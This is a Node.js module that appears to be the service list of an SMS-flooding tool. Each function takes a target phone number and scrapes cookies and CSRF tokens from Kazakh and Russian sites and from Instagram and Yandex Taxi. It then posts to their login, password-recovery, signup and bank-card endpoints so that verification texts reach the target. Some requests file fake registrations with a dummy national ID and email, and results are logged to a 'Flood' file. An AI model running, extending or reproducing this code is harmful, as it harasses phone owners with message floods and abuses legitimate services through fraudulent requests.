const request = require('request');
const my_functions = require('../../../scripts/funcs.js')

module.exports = {
	kolesa (number, service) {
		const url_2 = "https://id.kolesa.kz/getInfoAuth.json";

		let options = {
		url: "https://id.kolesa.kz",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request (options, function (error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', 'Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'].toString(),
				csrf_val = body.search('name="csrf" value="'),
				csrf = body.substring(csrf_val + 19, csrf_val + 51),
				body_2 = 'project=kolesa&login=7' + number + '&csrf=' + csrf;

				request({
					url: url_2,
					method: "POST",
					headers: {
						"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
						"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
						"Cookie" : cookie
					},
					body : body_2
					}, function(error, responce, body){
						if (error) { 
							my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
						} else {
							try {
								if (body.length > 1000) {
									my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
								} else {
									my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
								}
							}
							catch {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
							}
						}
					}
				)
			}
		});

	},

	rutaxi_sms (number, service) {
		let body_for_2req = "l=" + number + "&p=&rem=0&c=3";

		let options = {
		url: "https://samara.rutaxi.ru/index.html",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request (options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'],
				position_1 = body.search('window.qip'),
				value_1 = position_1 + 14,
				position_2 = body.search('<!--page'),
				value_2 = position_2 - 15,
				values = body.substring(value_1, value_2),
				url_for_2req = "https://samara.rutaxi.ru/ajax_auth.html?qip=" + values + "&lang=ru&source=0";

				request({
					url: url_for_2req,
					method: "POST",
					headers: {
					"X-Requested-With" : "XMLHttpRequest",
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8",
					"Origin" : "https://samara.rutaxi.ru",
					"Referer" : "https://samara.rutaxi.ru/index.html?state=closedialog",
					"Cookie" : cookie
					},
					body : body_for_2req
				}, function(error, responce, body){
					if (error) { 
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							var encoded_body = JSON.parse(body);
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + encoded_body.err)
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				)
			}
		});

	},

	instagram (number, service) {
		let url_to_2req_instagram = "https://www.instagram.com/accounts/account_recovery_send_ajax/",
		reqbody_to_2req_instagram = "email_or_username=7" + number + "&recaptcha_challenge_field=";

		let options = {
		url: "https://www.instagram.com",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};


		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'],
				csrf_token = cookie[8],
				csrf = csrf_token.split(" ", 1);

				request({
					url: url_to_2req_instagram,
					method: "POST",
					headers: {
					"Content-Type" : "application/x-www-form-urlencoded",
					"X-Requested-With" : "XMLHttpRequest",
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"X-CSRFToken" : csrf
					},
					body : reqbody_to_2req_instagram
				}, function(error, responce, body){
					if (error) { 
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				)
			}
		});

	},

	instagram_2 (number, service) {
		let url_to_2req_instagram = "https://www.instagram.com/accounts/send_signup_sms_code_ajax/";

		let options = {
		url: "https://www.instagram.com",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request(options, function(error, responce, body){
		if (error) {
			my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
		} else {
			let cookie = responce.headers['set-cookie'],
			csrf_token = cookie[8],
			csrf = csrf_token.split(" ", 1),
			id = cookie.length - 1,
			client_id = cookie[id],
			client_id_str = client_id.split(" ", 1).toString().substring(4),
			body_2 = "client_id=" + client_id_str + "&phone_number=7" + number + "&phone_id=&big_blue_token="

			request({
				url: url_to_2req_instagram,
				method: "POST",
				headers: {
				"Content-Type" : "application/x-www-form-urlencoded",
				"X-Requested-With" : "XMLHttpRequest",
				"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
				"X-CSRFToken" : csrf
				},
				body : body_2
			}, function(error, responce, body){
				if (error) { 
					my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
				} else {
					try {
						if (body.length > 1000) {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
						} else {
							my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
						}
					}
					catch {
						my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
					}
				}
			}
			)
		}
		})

	},

	yandex_taxi (number, service) {
		let number_req = "+7" + number,
		data = {},
		jsonData = JSON.stringify(data),
		url_to_2req = "https://taxi.yandex.kz/3.0/auth/";

		let options = {
		url: "https://taxi.yandex.kz/3.0/launch/",
		method: "POST",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
			"Content-Type" : "application/json",
			"X-Requested-With" : "XMLHttpRequest"
		},	
		body: jsonData
		};

		request(options, function(error, responce, body){
		if (error) {
			my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
		} else {
			let body_parse = JSON.parse(body),
			body_id = body_parse.id,
	 		body_to_2req = {"id": body_id, "phone": number_req},
			jsonData_for_2req = JSON.stringify(body_to_2req);

			request({
				url: url_to_2req,
				method: "POST",
				headers: {
				"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
				"Content-Type" : "application/json",
				"X-Requested-With" : "XMLHttpRequest"
				},
				body : jsonData_for_2req
			}, function(error, responce, body){
				if (error) { 
					my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
				} else {
					try {
						if (body.length > 1000) {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
						} else {
							my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
						}
					}
					catch {
						my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
					}
				}
			}
			)
		}
		})

	},

	satu (number, service) {
		var url_to_2req = "https://my.satu.kz/opinion/validate_user_popup_form",
		reqbody_to_2req = "author_phone=%2B7" + number + "&agreement=on";
		
		var options = {
		url: "https://satu.kz/",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				var cookie = responce.headers['set-cookie'],
				csrf_token = cookie[3];
				csrf = csrf_token.split(" ", 1).toString().substring(11, 43);

				request({
					url: url_to_2req,
					method: "POST",
					headers: {
					"Content-Type" : "application/x-www-form-urlencoded",
					"X-Requested-With" : "XMLHttpRequest",
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"X-CSRFToken" : csrf,
					"Cookie" : csrf_token
					},
					body : reqbody_to_2req
				}, function(error, responce, body){
					if (error) { 
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				);
			}
		});

	},

	ffins_creat (number, service) {
		let url_2 = 'https://ffins.kz/auth/register';

		var options = {
		url: "https://ffins.kz/auth/register",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				try {
					let cookie = responce.headers['set-cookie'],
					cookie_1 = cookie[1].split(" ", 1),
					cookie_2 = cookie[2].split(" ", 1),
					cookie_all = cookie_1 + ' ' + cookie_2,
					csrf_val = body.search('csrf-token'),
					csrf_token = body.substring(csrf_val + 21, csrf_val + 61),
					body_2 = '_token=' + csrf_token + '&redirect=&iin=900101001809&phone=+7' + number + '&email=aasdasd%40ya.ru';

					request({
						url: url_2,
						method: "POST",
						headers: {
						"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
						"Content-Type" : "application/x-www-form-urlencoded",
						"Cookie" : cookie_all
						},
						body : body_2
					}, function(error, responce, body){
						if (error) { 
							my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
						} else {
							try {
								if (body.length > 1000) {
									my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
								} else {
									my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Должно быть 200')
								}
							}
							catch {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
							}
						}
					}
					);
				}
				catch {
					my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: куках' + service)
				}
			}
		});

	},

	ffins_reset (number, service) {
		let url_2 = 'https://ffins.kz/auth/reset';

		var options = {
		url: "https://ffins.kz/auth/register",
		method: "GET",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
			}
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'],
				cookie_1 = cookie[1].split(" ", 1),
				cookie_2 = cookie[2].split(" ", 1),
				cookie_all = cookie_1 + ' ' + cookie_2,
				csrf_val = body.search('csrf-token'),
				csrf_token = body.substring(csrf_val + 21, csrf_val + 61),
				body_2 = '_token=' + csrf_token + '&phone=+7' + number;

				request({
					url: url_2,
					method: "POST",
					headers: {
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"Content-Type" : "application/x-www-form-urlencoded",
					"Cookie" : cookie_all
					},
					body : body_2
				}, function(error, responce, body){
					if (error) { 
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' должно быть 302')
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				);
			}
		});

	},

	eubank (number, service) {
		let url_2 = 'https://eubank.kz/ajax',
		body_1 = 'action=saveRelease&iin=900101001809&phone=%2B7' + number + '&city=1000&cardType=VISG',
		body_2 = 'action=sendSMS';

		var options = {
		url: "https://eubank.kz/ajax",
		method: "POST",
		headers: {
			"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
			"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8"
			},
		body: body_1	
		};

		request(options, function(error, responce, body){
			if (error) {
				my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
			} else {
				let cookie = responce.headers['set-cookie'],
				card_id = cookie[3].split(' ', 1).toString();

				request({
					url: url_2,
					method: "POST",
					headers: {
					"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
					"Content-Type" : "application/x-www-form-urlencoded",
					"Cookie" : card_id
					},
					body : body_2
				}, function(error, responce, body){
					if (error) { 
						my_functions.append_in_file('Error_data.txt', number + ' Ошибка в сервисе: ' + service + ' ' + error)
					} else {
						try {
							if (body.length > 1000) {
								my_functions.append_in_file('Flood_data.txt', number + ' Сработал length > 1000 в сервисе ' + service + ": " + responce.statusCode + " Длина ответа: " + body.length)
							} else {
								my_functions.append_in_file('Flood_data.txt', number + ' ' + service + ": " + responce.statusCode + ' Body: ' + body)
							}
						}
						catch {
							my_functions.append_in_file('Flood_data.txt', number + ' Сработал catch в сервисе: ' + service + ' ' + responce.statusCode + ' ' + body)
						}
					}
				}
				);
			}
		});

	}

}